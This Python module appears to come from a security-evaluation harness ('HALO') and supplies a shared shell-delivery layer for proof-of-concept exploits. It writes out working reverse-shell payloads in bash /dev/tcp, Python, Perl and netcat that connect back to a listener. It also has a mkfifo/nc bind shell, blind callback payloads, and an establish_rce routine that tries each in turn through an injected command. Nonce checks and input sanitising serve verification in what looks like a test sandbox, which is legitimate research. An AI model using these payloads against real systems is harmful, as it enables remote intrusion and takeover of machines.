"""Generalized breach-delivery primitive for HALO curated PoCs.

Target-agnostic shell delivery + challenge-response (nonce) proof, shared by every
PoC under pocs/. Stdlib-socket only — runs unchanged in python:3.12-slim.

Trust model: the MODEL is untrusted, the PoC CODE is trusted (we wrote+tested it), the
TARGET is untrusted. A per-attempt nonce (minted by the orchestrator, injected as
HALO_NONCE) is echoed back by the target; only a matching echo proves *our* command ran
on *this* target — a tarpit streaming `uid=0(root)` cannot forge it.
"""
from __future__ import annotations

import hashlib
import os
import random
import re
import socket
import time
from dataclasses import dataclass

_EVIDENCE_PREFIX = "HALO-EVIDENCE"


def make_nonce() -> str:
    """A fresh unpredictable hex token. os.urandom so a target can't guess it."""
    return os.urandom(12).hex()


def _rand_operand() -> int:
    """A per-attempt integer the target must ADD — forcing computation, not echo."""
    return random.randint(1000, 9_999_999)


def payload_fingerprint(payload: str) -> str:
    """Short stable hash of a payload, for binding a challenge to what we sent."""
    return hashlib.sha256(payload.encode()).hexdigest()[:16]


@dataclass(frozen=True)
class Challenge:
    """A per-attempt proof challenge. `nonce` gives freshness; `a`,`b` force the target
    to COMPUTE (sum) rather than echo; the binding fields tie the answer to THIS attempt,
    target, payload and channel; `expiry` is a time.monotonic() deadline (0 => none)."""
    nonce: str
    a: int
    b: int
    target: str = ""
    attempt_id: str = ""
    payload_hash: str = ""
    expected_channel: str = ""
    expiry: float = 0.0

    @property
    def expected_sum(self) -> int:
        return self.a + self.b

    def expired(self, _now: float | None = None) -> bool:
        if not self.expiry:
            return False
        now = time.monotonic() if _now is None else _now
        return now > self.expiry

    def matches(self, *, target: str | None = None, channel: str | None = None) -> bool:
        if target is not None and self.target and target != self.target:
            return False
        if channel is not None and self.expected_channel and channel != self.expected_channel:
            return False
        return True

    @classmethod
    def ephemeral(cls, nonce: str) -> "Challenge":
        """Unbound single-use challenge for callers still passing a bare nonce string."""
        return cls(nonce=nonce, a=_rand_operand(), b=_rand_operand())


def mint_challenge(target: str = "", *, attempt_id: str = "", payload_hash: str = "",
                   channel: str = "", ttl: float = 30.0) -> Challenge:
    return Challenge(
        nonce=make_nonce(), a=_rand_operand(), b=_rand_operand(),
        target=target, attempt_id=attempt_id, payload_hash=payload_hash,
        expected_channel=channel,
        expiry=(time.monotonic() + ttl) if ttl else 0.0,
    )


class ChallengeRegistry:
    """Process-local mint + consume-once. Rejects replayed and cross-attempt answers."""

    def __init__(self) -> None:
        self._consumed: set[str] = set()

    def mint(self, target: str = "", **kw) -> Challenge:
        return mint_challenge(target, **kw)

    def consume(self, ch: Challenge) -> bool:
        if ch.nonce in self._consumed:
            return False
        self._consumed.add(ch.nonce)
        return True

    def validate(self, ch: Challenge, *, target: str | None = None,
                 channel: str | None = None) -> bool:
        return (not ch.expired()
                and ch.matches(target=target, channel=channel)
                and ch.nonce not in self._consumed)


def _sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


@dataclass(frozen=True)
class Breach:
    confirmed: bool
    level: str                 # "shell" | "blind-rce" | "none"
    nonce: str
    proof: str
    uid: str | None = None
    host: str | None = None
    exit_code: str | None = None

    def __bool__(self) -> bool:
        return self.confirmed

    def __str__(self) -> str:
        parts = [_EVIDENCE_PREFIX, f"nonce={self.nonce}", f"level={self.level}"]
        if self.uid is not None:
            parts.append(f"uid={self.uid}")
        if self.host is not None:
            parts.append(f"host={self.host}")
        if self.exit_code is not None:
            parts.append(f"exit={self.exit_code}")
        head = " ".join(parts)
        return f"{head}\n{self.proof}" if self.proof else head


def local_ip_for(target: str, _sock_factory=socket.socket) -> str:
    """the host's source IP toward `target` — the LHOST for a reverse shell.

    Works because the ATTACK sandbox is --network=host, so getsockname() sees the host's
    real interface (no packet is sent for a UDP connect())."""
    s = _sock_factory(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    finally:
        s.close()


_UID_RE = re.compile(r"uid=(\d+)\(")


_SAFE_TOKEN_RE = re.compile(r"\A[0-9A-Za-z._-]+\Z")


def _require_safe(name: str, value: str) -> str:
    """Reject any token that could break out of the shell command it is embedded in.
    nonce/lhost are interpolated into sh -c payloads unquoted; a metacharacter here
    would be command injection on the target, so fail closed."""
    if not _SAFE_TOKEN_RE.match(str(value)):
        raise ValueError(f"unsafe {name} for payload: {value!r}")
    return str(value)


def _drain(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except OSError:
        pass
    return b"".join(chunks)


def confirm_shell(sock: socket.socket, *, service: str = "", nonce: str = "",
                  timeout: float = 8.0) -> Breach:
    """Probe an already-open shell socket with a challenge-response marker.

    Confirmed only when the target echoes `<nonce>-MARK` — proves *our* command ran,
    so a banner/tarpit that streams `uid=0` without the nonce is NOT a breach."""
    nonce = nonce or make_nonce()
    mark = f"{nonce}-MARK"
    try:
        sock.sendall(f"echo {mark}; id; uname -n\n".encode())
        out = _drain(sock, timeout)
    except OSError:
        out = b""
    finally:
        try:
            sock.close()
        except OSError:
            pass
    text = out.decode("utf-8", "replace")
    if mark not in text:
        return Breach(confirmed=False, level="none", nonce=nonce, proof=text)
    m = _UID_RE.search(text)
    uid = m.group(1) if m else None
    host = None
    for line in text.splitlines():
        line = line.strip()
        if line and line != mark and not line.startswith("uid=") and " " not in line:
            host = line
            break
    return Breach(confirmed=True, level="shell", nonce=nonce, proof=text.strip(),
                  uid=uid, host=host, exit_code="0")


def _first_available(*variants: str) -> str:
    """Chain shell variants so the first present interpreter wins."""
    guarded = []
    for bin_name, cmd in variants:
        guarded.append(f"command -v {bin_name} >/dev/null 2>&1 && {{ {cmd}; }}")
    return " || ".join(guarded)


def reverse_payload(lhost: str, lport: int, nonce: str) -> str:
    """Announce the nonce, then hand /bin/sh back over the reverse connection."""
    _require_safe("lhost", lhost)
    _require_safe("nonce", nonce)
    lport = int(lport)
    bash = (f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3; "
            f"sh -i >&3 2>&3 <&3'")
    py = (f"python3 -c 'import socket,subprocess,os;"
          f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
          f"s.sendall(b\"{nonce}-MARK\\n\");"
          f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
          f"subprocess.call([\"/bin/sh\",\"-i\"])'")
    perl = (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"send(S,\"{nonce}-MARK\\n\",0);"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'")
    nc = (f"(echo {nonce}-MARK; /bin/sh -i) 2>&1 | nc {lhost} {lport}")
    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))


def bind_payload(bind_port: int, nonce: str) -> str:
    """Spawn /bin/sh bound to bind_port; connect+confirm_shell proves it (nonce sent on probe)."""
    _require_safe("nonce", nonce)
    bind_port = int(bind_port)
    fifo = "/tmp/.hb"
    return (f"rm -f {fifo}; mkfifo {fifo}; "
            f"cat {fifo} | /bin/sh -i 2>&1 | nc -l -p {bind_port} > {fifo} &")


def blind_callback_payload(lhost: str, lport: int, nonce: str) -> str:
    """Connect back and send ONLY the nonce — proves code ran without a shell channel."""
    _require_safe("lhost", lhost)
    _require_safe("nonce", nonce)
    lport = int(lport)
    bash = f"bash -c 'exec 3<>/dev/tcp/{lhost}/{lport}; echo {nonce}-MARK >&3'"
    py = (f"python3 -c 'import socket;s=socket.socket();"
          f"s.connect((\"{lhost}\",{lport}));s.sendall(b\"{nonce}-MARK\")'")
    perl = (f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));send(S,\"{nonce}-MARK\",0);'")
    nc = f"echo {nonce}-MARK | nc {lhost} {lport}"
    return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))


class _Listener:
    """Ephemeral TCP listener bound on the host (reachable via --network=host)."""

    def __init__(self, bind_ip: str = "0.0.0.0", timeout: float = 10.0):
        self._bind_ip = bind_ip
        self._timeout = timeout
        self._srv: socket.socket | None = None
        self.port = 0

    def __enter__(self) -> "_Listener":
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((self._bind_ip, 0))     # 0 → OS picks an ephemeral high port
        self._srv.listen(1)
        self._srv.settimeout(self._timeout)
        self.port = self._srv.getsockname()[1]
        return self

    def __exit__(self, *exc) -> None:
        if self._srv is not None:
            try:
                self._srv.close()
            finally:
                self._srv = None

    def accept_one(self) -> socket.socket | None:
        try:
            conn, _ = self._srv.accept()
            return conn
        except OSError:
            return None

    def wait_for_nonce(self, nonce: str) -> bool:
        conn = self.accept_one()
        if conn is None:
            return False
        try:
            data = _drain(conn, self._timeout)
        finally:
            conn.close()
        return f"{nonce}-MARK".encode() in data


def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
                  bind_port: int = 45444, ladder_timeout: float = 8.0,
                  _ip: str | None = None) -> Breach:
    """Given a blind single-command `inject`, walk the delivery ladder until a breach.

    Rung 1 reverse shell → Rung 2 bind shell → Rung 3 blind nonce callback. Returns the
    first confirmed Breach; never raises for a non-breach."""
    nonce = nonce or make_nonce()
    lhost = _ip or local_ip_for(target)

    # Rung 1: reverse shell — listener accepts the callback, confirm_shell probes it.
    with _Listener(timeout=ladder_timeout) as lis:
        try:
            inject(reverse_payload(lhost, lis.port, nonce))
        except Exception:
            pass
        conn = lis.accept_one()
        if conn is not None:
            br = confirm_shell(conn, service=service, nonce=nonce, timeout=ladder_timeout)
            if br:
                return br

    # Rung 2: bind shell — target binds /bin/sh; we connect out and probe.
    try:
        inject(bind_payload(bind_port, nonce))
    except Exception:
        pass
    deadline = time.time() + ladder_timeout
    while time.time() < deadline:
        try:
            sock = socket.create_connection((target, bind_port), timeout=ladder_timeout)
        except OSError:
            time.sleep(0.4)
            continue
        br = confirm_shell(sock, service=service, nonce=nonce, timeout=ladder_timeout)
        if br:
            return br
        break

    # Rung 3: blind nonce callback — prove exec even with no usable shell.
    with _Listener(timeout=ladder_timeout) as lis:
        try:
            inject(blind_callback_payload(lhost, lis.port, nonce))
        except Exception:
            pass
        if lis.wait_for_nonce(nonce):
            return Breach(confirmed=True, level="blind-rce", nonce=nonce,
                          proof=f"{nonce}-MARK received out-of-band", exit_code="0")

    return Breach(confirmed=False, level="none", nonce=nonce, proof="")
